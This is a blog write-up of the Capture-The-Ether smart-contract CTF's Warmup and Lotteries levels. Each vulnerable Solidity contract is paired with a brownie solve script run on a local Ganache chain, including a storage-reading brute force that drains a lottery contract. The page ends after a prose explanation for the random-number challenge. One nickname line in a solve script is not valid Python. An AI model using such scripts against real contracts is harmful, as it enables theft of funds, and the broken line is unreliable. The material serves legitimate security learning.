<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="WarmupDeploy a contract12345678pragma solidity ^0.4.21;contract DeployChallenge &amp;#123;    &#x2F;&#x2F; This tells the CaptureTheFlag contract that the challenge is complete.    function isComplete() public pur">
<meta property="og:type" content="article">
<meta property="og:title" content="Capture-The-Ether CTF - Warmup &amp; Lotteries">
<meta property="og:url" content="http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/index.html">
<meta property="og:site_name" content="chandu kona">
<meta property="og:description" content="WarmupDeploy a contract12345678pragma solidity ^0.4.21;contract DeployChallenge &amp;#123;    &#x2F;&#x2F; This tells the CaptureTheFlag contract that the challenge is complete.    function isComplete() public pur">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-12-01T15:14:44.000Z">
<meta property="article:modified_time" content="2022-12-07T03:03:53.740Z">
<meta property="article:author" content="Chandu Kona">
<meta property="article:tag" content="SmartContract">
<meta property="article:tag" content="ethereum">
<meta property="article:tag" content="solidity">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="CaptureTheEther">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Capture-The-Ether CTF - Warmup &amp; Lotteries</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/11/17/19-27-Ethernaut-CTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&text=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&is_video=false&description=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Capture-The-Ether CTF - Warmup &amp; Lotteries&body=Check out this article: http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&name=Capture-The-Ether CTF - Warmup &amp; Lotteries&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&t=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Warmup"><span class="toc-number">1.</span> <span class="toc-text">Warmup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Deploy-a-contract"><span class="toc-number"></span> <span class="toc-text">Deploy a contract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Call-me"><span class="toc-number"></span> <span class="toc-text">Call me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Choose-a-nickname"><span class="toc-number"></span> <span class="toc-text">Choose a nickname</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lotteries"><span class="toc-number">1.</span> <span class="toc-text">Lotteries</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-number"><span class="toc-number"></span> <span class="toc-text">Guess the number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-secret-number"><span class="toc-number"></span> <span class="toc-text">Guess the secret number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-random-number"><span class="toc-number"></span> <span class="toc-text">Guess the random number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-new-number"><span class="toc-number"></span> <span class="toc-text">Guess the new number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-future"><span class="toc-number"></span> <span class="toc-text">Predict the future</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-block-hash"><span class="toc-number"></span> <span class="toc-text">Predict the block hash</span></a>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Capture-The-Ether CTF - Warmup &amp; Lotteries
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Chandu Kona</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-12-01T15:14:44.000Z" itemprop="datePublished">2022-12-01</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CaptureTheEther/" rel="tag">CaptureTheEther</a>, <a class="tag-link-link" href="/tags/SmartContract/" rel="tag">SmartContract</a>, <a class="tag-link-link" href="/tags/ethereum/" rel="tag">ethereum</a>, <a class="tag-link-link" href="/tags/solidity/" rel="tag">solidity</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <hr>
<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><h2 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a>Deploy a contract</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DeployChallenge</span> &#123;</span><br><span class="line">    <span class="comment">// This tells the CaptureTheFlag contract that the challenge is complete.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public pure returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This challenge is to introduce us how a smart contract is deployed in this case since the ropsten network is depreciated <strong>I am using local Ganache network with brownie framework to deploy and interact with the contracts</strong>.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DeployChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    player = accounts[<span class="number">0</span>]</span><br><span class="line">    contract = DeployChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a>Call me</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CallMeChallenge</span> &#123;</span><br><span class="line">    bool public isComplete = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">callme</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we just need to call the <code>callme()</code> function of the contract.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> CallMeChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = CallMeChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    contract.callme(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a>Choose a nickname</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Relevant part of the CaptureTheEther contract.</span></span><br><span class="line">contract <span class="title class_">CaptureTheEther</span> &#123;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setNickname</span>(<span class="params">bytes32 nickname</span>) public &#123;</span><br><span class="line">        nicknameOf[msg.<span class="property">sender</span>] = nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Challenge contract. You don&#x27;t need to do anything with this; it just verifies</span></span><br><span class="line"><span class="comment">// that you set a nickname for yourself.</span></span><br><span class="line">contract <span class="title class_">NicknameChallenge</span> &#123;</span><br><span class="line">    <span class="title class_">CaptureTheEther</span> cte;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Your address gets passed in as a constructor parameter.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">NicknameChallenge</span>(<span class="params">address _player, address _cte</span>) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        cte = <span class="title class_">CaptureTheEther</span>(_cte);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the first character is not null.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> cte.<span class="title function_">nicknameOf</span>(player)[<span class="number">0</span>] != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to choose a nickname by calling the <code>setNickname()</code> function with our nickname as the argument.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> CaptureTheEther, NicknameChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    cte_contract = CaptureTheEther.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    nc_contract = NicknameChallenge.deploy(</span><br><span class="line">        player, cte_contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># padded null bytes just to make it 32 bytes.</span></span><br><span class="line">    cte_contract.setNickname(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">28</span> = <span class="string">b&#x27;pyr0&#x27;</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> nc_contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h3><h2 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheNumberChallenge</span> &#123;</span><br><span class="line">    uint8 answer = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to guess the answer, but the answer is hardcoded inside the contract and it is <code>42</code> so we can complete this chllange just by calling <code>guess()</code> function with number <code>42</code> as the argument.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> GuessTheNumberChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.guess(<span class="number">42</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheSecretNumberChallenge</span> &#123;</span><br><span class="line">    bytes32 answerHash = <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheSecretNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">keccak256</span>(n) == answerHash) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to guess the answer, unlike the previous challenge here the hash of the answer is hardcoded instead of the answer and it is almost impossible to crack the hash and get the answer, however we can observe that the <code>guess()</code> function takes <code>uint8</code> as the argument which means the range of the answer lies in between <code>0-256</code> which is bruteforcable. so to solve this challenge we can bruteforce the answer and check with hash to get the answer and pass it to <code>guess()</code> function.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> GuessTheSecretNumberChallenge, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheSecretNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> web3.eth.get_storage_at(contract.address, <span class="number">0</span>) == web3.soliditySha3(abi_types=[<span class="string">&#x27;uint8&#x27;</span>], values=[i]):</span><br><span class="line">            contract.guess(i, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[ ] got the Guess: <span class="subst">&#123;i&#125;</span> !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheRandomNumberChallenge</span> &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheRandomNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to guess the random number generated by the contract. one thing to remember is ethereum virtual machine is a deterministic machine and it can’t generate sudo random numbers inside the contract, if it does generate a random number then the miner gets the advantage of executing the transaction muptiple times until he gets a random number of his desire and then include the transaction in the blockchain, this is an unfair advantage for the miner and contradict the basic concept of desentralisation. however here the contract is using the blockhash of the previous block and the time to get the random number and stores it in the contract since all the storage in a smart contract is public we can read the number and pass it <code>guess()</code> function to solve this challenge.</p>
